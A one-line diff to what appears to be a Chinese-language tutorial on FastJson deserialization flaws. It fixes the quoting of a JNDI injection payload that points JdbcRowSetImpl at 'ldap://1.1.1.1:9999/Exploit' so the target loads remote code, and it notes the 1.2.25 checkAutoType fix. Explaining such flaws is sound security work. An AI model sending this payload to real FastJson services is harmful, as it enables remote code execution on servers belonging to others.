@@ -611,7 +611,7 @@ FastJson在解析时会提取类中的setter和getter方法，如果JSON的键�
 这个版本没有任何防范，通过`com.sun.rowset.JdbcRowSetImpl`进行JNDI注入，Jdbc的source允许指定JNDI URL
 
 ```java
-exp = {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://1.1.1.1:9999/Exploit\", \"autoCommit\":true}";
+exp = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://1.1.1.1:9999/Exploit\", \"autoCommit\":true}";
 ```
 
 修补后1.2.25添加了`AutoTypeSupport`，增加了`checkAutoType`函数，函数中是白名单 + 黑名单机制
